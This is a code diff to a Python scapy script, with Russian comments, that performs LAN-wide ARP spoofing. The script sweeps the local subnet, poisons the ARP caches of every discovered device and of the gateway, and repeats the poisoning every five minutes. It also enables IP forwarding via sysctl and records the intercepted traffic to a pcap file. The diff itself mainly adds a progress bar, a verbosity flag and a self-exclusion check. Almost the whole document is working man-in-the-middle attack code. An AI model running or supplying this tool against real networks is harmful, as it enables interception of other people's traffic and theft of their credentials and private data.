@@ -12,7 +12,10 @@ from scapy.layers.l2 import ARP, Ether
 from scapy.utils import PcapWriter
 import os
 import sys
+from rich.progress import Progress
 
+global verbose_enabled
+verbose_enabled = True
 
 def check_privileges():
     if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
@@ -43,9 +46,11 @@ def arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_ma
     send(arp_to_client_packet, verbose=0, count=3)
     arp_to_AP_packet = ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=gateway_mac, pdst=gateway_ip)
     send(arp_to_AP_packet, verbose=0, count=3)
-    print(f"ARP-подделка Клиент думает, что: {gateway_ip} ({gateway_mac}) -> {gateway_ip} ({spoof_mac})")
-    print(f"                 AP думает, что: {target_ip} ({target_mac})   -> {target_ip} ({spoof_mac})")
-    print(arp_packet.show())
+    global verbose_enabled
+    if not verbose_enabled:
+        print(f"ARP-подделка Клиент думает, что: {gateway_ip} ({gateway_mac}) -> {gateway_ip} ({spoof_mac})")
+        print(f"                 AP думает, что: {target_ip} ({target_mac})   -> {target_ip} ({spoof_mac})")
+        print(arp_packet.show())
 
 
 def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured_traffic.pcap"):
@@ -114,27 +119,38 @@ def restart_network_interface(interface):
 
 def get_gateway_mac(gateway):
     arp_packet = ARP(op=1, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff")
-    ans = sr1(arp_packet)
+    ans = sr1(arp_packet, verbose=0)
     return ans.hwsrc
 
+
 def send_arp_requests(interface="eth0"):
-  """
-  Функция для отправки массовых ARP-запросов.
-  """
-  # IP-адрес сети (например, 192.168.1.0/24)
-  network = str(get_if_addr(interface)).rpartition(".")[0]+".0/24"
-  for i in range(1, 255):
-    target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
-    arp_packet = ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
-    send(arp_packet, verbose=0)
-    print(f"ARP-запрос отправлен на {target_ip}")
-    time.sleep(0.03) # небольшая задержка между запросами
+    """
+    Функция для отправки массовых ARP-запросов.
+    """
+    # IP-адрес сети (например, 192.168.1.0/24)
+    network = str(get_if_addr(interface)).rpartition(".")[0] + ".0/24"
+    spoof_ip = get_if_addr(interface)
+    spoof_mac = get_if_hwaddr(interface)
+    with Progress() as progress:
+        print(f"Изучаю локальную подсеть {network}...")
+        task = progress.add_task(f"[red]Изучаю локальную подсеть {network}...", total=255)
+        for i in range(1, 255):
+            target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
+            progress.update(task, description=f"[red]Отправляю ARP-запрос на  {target_ip}")
+            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
+                                                              psrc=spoof_ip, hwsrc=spoof_mac)
+            srp(arp_packet, timeout=0.3, verbose=0)
+            progress.update(task, advance=1)
+    os.system("clear")
 
 
 def main():
     check_privileges()
     default_if = get_default_if()
     default_gateway = str(get_if_addr(default_if)).rpartition(".")[0] + ".1"
+
+    os.system("sysctl -w net.ipv4.ip_forward=1")
+
     parser = argparse.ArgumentParser(description="ARP-подделка с обнаружением новых устройств.")
     if len(sys.argv) == 1:
         parser.print_help()
@@ -143,6 +159,7 @@ def main():
                         default=default_if)
     parser.add_argument("-g", "--gateway", type=str, help="Ip-адрес роутера", default=default_gateway)
     parser.add_argument("-w", type=str, help="Файл для записи перехваченных пакетов", default="captured_traffic.pcap")
+    parser.add_argument("-v", type=bool, help="Включение расширенного вывода (True/False)", default=True)
 
     args = parser.parse_args()
 
@@ -153,6 +170,8 @@ def main():
     gateway_ip = args.gateway
     gateway_mac = get_gateway_mac(gateway_ip)
     pcap_name = args.w
+    global verbose_enabled
+    verbose_enabled = args.v
 
     # Создаем очередь для передачи данных
     queue = Queue()
@@ -161,11 +180,12 @@ def main():
     sniff_thread = threading.Thread(target=sniff_and_find_new_devices, args=(interface, queue, pcap_name))
     sniff_thread.daemon = True  # Делаем поток фоновым
     sniff_thread.start()
+    time.sleep(1)
 
     old_list = []
     # Словарь для хранения времени последней ARP-подделки для каждого устройства
     last_spoof_time = {}
-    
+
     send_arp_requests(interface)
 
     while True:
@@ -173,19 +193,19 @@ def main():
             # Извлекаем данные из очереди
             target_ip, target_mac = queue.get(timeout=1)
             # Отправляем ARP-подделку
-            #arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
-            if target_ip not in old_list:
-              # Добавляем устройство в очередь
-              old_list.append(target_ip)
-              # Отправляем ARP-подделку для нового устройства сразу
-              arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
-              last_spoof_time[target_ip] = time.time()
-            else:
-              # Проверяем время последней ARP-подделки для этого устройства
-              if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 300:
-                # Отправляем ARP-подделку, если прошло более 5 минут
+            # arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
+            if target_ip not in old_list and target_ip != spoof_ip:
+                # Добавляем устройство в очередь
+                old_list.append(target_ip)
+                # Отправляем ARP-подделку для нового устройства сразу
                 arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
                 last_spoof_time[target_ip] = time.time()
+            else:
+                # Проверяем время последней ARP-подделки для этого устройства
+                if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 300:
+                    # Отправляем ARP-подделку, если прошло более 5 минут
+                    arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
+                    last_spoof_time[target_ip] = time.time()
         except Empty:
             # Ожидаем новые данные
             pass
